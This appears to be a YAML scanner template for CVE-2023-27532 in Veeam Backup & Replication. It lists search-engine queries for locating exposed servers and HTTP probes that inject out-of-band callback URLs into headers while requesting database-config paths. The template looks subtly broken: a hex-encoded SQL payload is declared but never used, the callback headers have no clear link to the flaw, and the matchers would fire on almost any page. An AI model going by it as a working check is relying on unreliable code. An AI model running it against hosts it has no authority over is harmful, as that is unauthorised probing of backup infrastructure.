id: CVE-2023-27532

info:
  name: Veeam Backup & Replication - Credential Disclosure
  author: pdresearch
  severity: high
  description: |
    Veeam Backup & Replication allows encrypted credentials stored in the configuration database to be obtained by attackers who can access backup infrastructure hosts. This vulnerability can be exploited by accessing the Veeam configuration database and extracting encrypted credentials from it.
  impact: |
    Successful exploitation allows attackers to obtain encrypted credentials from the configuration database, potentially leading to unauthorized access to backup systems and connected infrastructure. This vulnerability has been actively exploited in ransomware campaigns including Akira and Qilin.
  remediation: Update Veeam Backup & Replication to version 12.0.0.1421 or later
  reference:
    - https://www.veeam.com/kb4424
    - https://github.com/horizon3ai/CVE-2023-27532
    - https://github.com/sfewer-r7/CVE-2023-27532
    - https://github.com/puckiestyle/CVE-2023-27532-RCE-Only
    - https://nvd.nist.gov/vuln/detail/CVE-2023-27532
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-27532
    cwe-id: CWE-306
    epss-score: 0.87024
    epss-percentile: 0.99406
    cpe: cpe:2.3:a:veeam:backup_and_replication:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: veeam
    product: backup_and_replication
    shodan-query:
      - "Veeam Backup" http.title:"Veeam Backup Enterprise Manager"
      - http.title:"veeam backup enterprise manager"
      - http.favicon.hash:169658321
    fofa-query:
      - title="Veeam Backup Enterprise Manager"
      - title="veeam backup enterprise manager"
    google-query: intitle:"Veeam Backup Enterprise Manager"
  tags: cve,cve2023,veeam,backup,credential-disclosure,http,kev,vkev,akira,qilin,ransomware,oast

variables:
  # Test payload to trigger credential database access
  test_payload: '{{ hex_decode("53454c454354202a2046524f4d20566565616d436f6e66696775726174696f6e") }}'

http:
  # First detect Veeam Backup & Replication installation
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/login.aspx"
      - "{{BaseURL}}/api/v1/serverinfo"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "Veeam Backup Enterprise Manager"
          - "Veeam Backup & Replication"
          - "Veeam.Backup.Web"
        condition: or

      - type: word
        part: header
        words:
          - "X-Veeam-Server"
          - "Veeam-Backup"
        condition: or

    extractors:
      - type: regex
        name: version
        part: body
        group: 1
        regex:
          - "version.*?(11\.0\.1\.1261|12\.0\.0\.1420)"
        internal: true

  # Test for vulnerable versions and credential disclosure
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/serverinfo"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      X-Api-Version: "1.1-rev1"
      # Try to trigger database credential access via OAST
      Referer: "http://{{interactsh-url}}/test"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"databaseVendor":'
          - '"databaseContentVersion":'
        condition: or

      - type: word
        part: body
        words:
          - "11.0.1.1261"
          - "12.0.0.1420"
        condition: or

      - type: dsl
        dsl:
          - contains(interactsh_protocol, 'dns')
          - contains(interactsh_protocol, 'http')
        condition: or

  # Test database connectivity and credential extraction
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/database/config"
      - "{{BaseURL}}/api/v1/config/database"
      - "{{BaseURL}}/api/v1/backup/database"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      X-Api-Version: "1.1-rev1"
      # Test with malicious payload to trigger credential disclosure
      X-Forwarded-For: "{{interactsh-url}}"
      Referer: "http://{{interactsh-url}}/database"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "database"
          - "credential"
          - "encrypted"
          - "VeeamConfiguration"
          - "connectionString"
        condition: or

      - type: word
        part: body
        words:
          - "11.0.1.1261"
          - "12.0.0.1420"
        condition: or

      - type: dsl
        dsl:
          - contains(interactsh_protocol, 'dns')
          - contains(interactsh_protocol, 'http')
          - status_code == 200
        condition: or
